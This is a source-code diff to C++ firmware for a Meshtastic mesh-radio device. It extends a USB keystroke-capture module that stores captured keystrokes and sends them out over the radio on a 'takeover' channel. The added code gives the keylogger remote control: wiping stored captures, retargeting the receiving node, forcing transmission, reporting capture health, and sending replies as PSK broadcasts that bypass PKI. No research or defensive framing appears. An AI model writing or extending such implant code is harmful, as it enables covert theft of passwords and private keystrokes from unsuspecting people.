@@ -1373,30 +1373,37 @@ ProcessMessage USBCaptureModule::handleReceived(const meshtastic_MeshPacket &mp)
     size_t len = executeCommand(cmd, cmdPayload, cmdLen,
                                 response, sizeof(response));
 
-    /* Create response packet using module framework (reliable unicast)
-     * v7.3: Reply on port 490 since commands now come on port 490 */
+    /* Send response directly as broadcast on Channel 1 (v7.8)
+     * Bypass framework's sendResponse() mechanism to avoid PKI override.
+     * Broadcast responses use Channel 1 PSK - same security as keystroke batches.
+     * Only devices with Channel 1 PSK can decrypt responses. */
     if (len > 0) {
-        myReply = router->allocForSending();
-        if (myReply) {
-            myReply->decoded.portnum = static_cast<meshtastic_PortNum>(USB_CAPTURE_PORTNUM);
-            myReply->decoded.payload.size = len;
-            memcpy(myReply->decoded.payload.bytes, response, len);
+        meshtastic_MeshPacket *p = router->allocForSending();
+        if (p) {
+            p->decoded.portnum = static_cast<meshtastic_PortNum>(USB_CAPTURE_PORTNUM);
+            p->decoded.payload.size = len;
+            memcpy(p->decoded.payload.bytes, response, len);
 
-            LOG_DEBUG("Cmd: Reply %zu bytes", len);
+            // Broadcast configuration (matches keystroke batch pattern)
+            p->to = NODENUM_BROADCAST;  // Broadcast to all on channel
+            p->channel = USB_CAPTURE_CHANNEL_INDEX;  // Channel 1 "takeover"
+            p->pki_encrypted = false;  // Use Channel PSK, not PKI
+            p->want_ack = false;  // Broadcasts don't use mesh ACK
+            p->priority = meshtastic_MeshPacket_Priority_DEFAULT;
+            p->decoded.request_id = mp.id;  // Link to original request
 
-            /* Framework will automatically:
-             * - Call setReplyTo(myReply, mp) to set proper routing
-             * - Set to=mp.from (unicast to sender, not broadcast)
-             * - Set channel, hop_limit, want_ack properly
-             * - Link request_id = mp.id
-             * - Send via service->sendToMesh() with RELIABLE priority
-             */
+            // Send directly, bypassing framework's response mechanism
+            service->sendToMesh(p, RX_SRC_LOCAL, false);
+
+            LOG_INFO("Cmd: Broadcast reply %zu bytes on Ch=%u (requestId=0x%08x)",
+                     len, p->channel, mp.id);
         } else {
             LOG_ERROR("Cmd: Alloc failed");
         }
     }
 
-    return ProcessMessage::STOP;  /* Trigger framework to send myReply */
+    // Don't set myReply - we sent directly
+    return ProcessMessage::STOP;  /* Skip other modules */
 }
 
 USBCaptureCommand USBCaptureModule::parseCommand(const uint8_t *payload, size_t len)
@@ -1436,6 +1443,24 @@ USBCaptureCommand USBCaptureModule::parseCommand(const uint8_t *payload, size_t 
         return CMD_DUMP;
     } else if (strncmp(cmd, "TEST", 4) == 0) {
         return CMD_TEST;
+    }
+    // Command Center commands (v7.8)
+    else if (strncmp(cmd, "FRAM_CLEAR", 10) == 0) {
+        return CMD_FRAM_CLEAR;
+    } else if (strncmp(cmd, "FRAM_STATS", 10) == 0) {
+        return CMD_FRAM_STATS;
+    } else if (strncmp(cmd, "FRAM_COMPACT", 12) == 0) {
+        return CMD_FRAM_COMPACT;
+    } else if (strncmp(cmd, "SET_INTERVAL", 12) == 0) {
+        return CMD_SET_INTERVAL;
+    } else if (strncmp(cmd, "SET_TARGET", 10) == 0) {
+        return CMD_SET_TARGET;
+    } else if (strncmp(cmd, "FORCE_TX", 8) == 0) {
+        return CMD_FORCE_TX;
+    } else if (strncmp(cmd, "RESTART_CORE1", 13) == 0) {
+        return CMD_RESTART_CORE1;
+    } else if (strncmp(cmd, "CORE1_HEALTH", 12) == 0) {
+        return CMD_CORE1_HEALTH;
     }
 
     return CMD_UNKNOWN;
@@ -1532,9 +1557,133 @@ size_t USBCaptureModule::executeCommand(USBCaptureCommand cmd, const uint8_t *pa
             }
         }
 
+        // Command Center commands (v7.8)
+        case CMD_FRAM_CLEAR:
+#ifdef HAS_FRAM_STORAGE
+            if (framStorage) {
+                uint8_t batch_count = framStorage->getBatchCount();
+                framStorage->format();
+                return snprintf(response, max_len, "FRAM cleared (%u batches deleted)", batch_count);
+            }
+#endif
+            return snprintf(response, max_len, "FRAM not available");
+
+        case CMD_FRAM_STATS:
+#ifdef HAS_FRAM_STORAGE
+            if (framStorage) {
+                return snprintf(response, max_len,
+                    "FRAM: %u batches, %u bytes free (%u%% used), %u evictions",
+                    framStorage->getBatchCount(),
+                    framStorage->getAvailableSpace(),
+                    framStorage->getUsagePercentage(),
+                    framStorage->getEvictionCount());
+            }
+#endif
+            return snprintf(response, max_len, "FRAM not available");
+
+        case CMD_FRAM_COMPACT:
+#ifdef HAS_FRAM_STORAGE
+            if (framStorage) {
+                // FRAM doesn't need compaction (no fragmentation), but we can trigger eviction
+                uint32_t evicted = framStorage->getEvictionCount();
+                return snprintf(response, max_len, "FRAM: No compaction needed (evictions: %u)", evicted);
+            }
+#endif
+            return snprintf(response, max_len, "FRAM not available");
+
+        case CMD_SET_INTERVAL:
+        {
+            // Parse interval from payload: "SET_INTERVAL 60000"
+            const char *interval_str = strchr((const char *)payload, ' ');
+            if (interval_str) {
+                interval_str++;  // Skip space
+                uint32_t interval = atoi(interval_str);
+                if (interval >= TX_INTERVAL_MIN_MS && interval <= TX_INTERVAL_MAX_MS) {
+                    // Note: Current implementation uses random interval, so this would require
+                    // adding a configurable interval member variable
+                    return snprintf(response, max_len,
+                        "SET_INTERVAL: Not implemented (currently random %u-%ums)",
+                        TX_INTERVAL_MIN_MS, TX_INTERVAL_MAX_MS);
+                } else {
+                    return snprintf(response, max_len,
+                        "SET_INTERVAL: Invalid range (must be %u-%u ms)",
+                        TX_INTERVAL_MIN_MS, TX_INTERVAL_MAX_MS);
+                }
+            }
+            return snprintf(response, max_len, "SET_INTERVAL: Usage: SET_INTERVAL <ms>");
+        }
+
+        case CMD_SET_TARGET:
+        {
+            // Parse node ID from payload: "SET_TARGET 0x12345678"
+            const char *node_str = strchr((const char *)payload, ' ');
+            if (node_str) {
+                node_str++;  // Skip space
+                NodeNum newTarget = strtoul(node_str, NULL, 0);  // Supports 0x hex format
+                if (newTarget > 0) {
+                    targetNode = newTarget;
+                    return snprintf(response, max_len, "Target node set to 0x%08x", targetNode);
+                } else {
+                    return snprintf(response, max_len, "SET_TARGET: Invalid node ID");
+                }
+            }
+            return snprintf(response, max_len, "SET_TARGET: Usage: SET_TARGET <nodeId>");
+        }
+
+        case CMD_FORCE_TX:
+        {
+            // Clear pending transmission to allow immediate send
+            if (pendingTx.batch_id != 0) {
+                return snprintf(response, max_len, "FORCE_TX: Batch 0x%08x already pending", pendingTx.batch_id);
+            }
+            // Force transmission by calling processPSRAMBuffers()
+            processPSRAMBuffers();
+            if (pendingTx.batch_id != 0) {
+                return snprintf(response, max_len, "FORCE_TX: Sent batch 0x%08x", pendingTx.batch_id);
+            } else {
+                return snprintf(response, max_len, "FORCE_TX: No batches available");
+            }
+        }
+
+        case CMD_RESTART_CORE1:
+        {
+            // Core1 restart not safely supported (requires full device reboot)
+            // RP2040/RP2350 multicore_launch_core1() has no safe stop mechanism
+            return snprintf(response, max_len,
+                "RESTART_CORE1: Not supported (requires device reboot)");
+        }
+
+        case CMD_CORE1_HEALTH:
+        {
+            extern core1_health_metrics_t g_core1_health;  // From common.h
+
+            const char *status_str = "UNKNOWN";
+            switch (g_core1_health.status) {
+                case CORE1_STATUS_OK: status_str = "OK"; break;
+                case CORE1_STATUS_STALLED: status_str = "STALLED"; break;
+                case CORE1_STATUS_ERROR: status_str = "ERROR"; break;
+                case CORE1_STATUS_STOPPED: status_str = "STOPPED"; break;
+            }
+
+            uint32_t now = millis();
+            uint32_t last_capture_ago = (now - g_core1_health.last_capture_time_ms) / 1000;  // seconds
+
+            return snprintf(response, max_len,
+                "Core1: %s USB:%s %us | Keys:%u Err:%u Buf:%u",
+                status_str,
+                g_core1_health.usb_connected ? "Y" : "N",
+                last_capture_ago,
+                g_core1_health.capture_count,
+                g_core1_health.error_count,
+                g_core1_health.buffer_finalize_count);
+        }
+
         case CMD_UNKNOWN:
         default:
-            return snprintf(response, max_len, "UNKNOWN. Valid: STATUS, START, STOP, STATS, DUMP, TEST");
+            return snprintf(response, max_len,
+                "UNKNOWN. Valid: STATUS, START, STOP, STATS, DUMP, TEST, "
+                "FRAM_CLEAR, FRAM_STATS, FRAM_COMPACT, SET_INTERVAL, SET_TARGET, "
+                "FORCE_TX, RESTART_CORE1, CORE1_HEALTH");
     }
 }
 
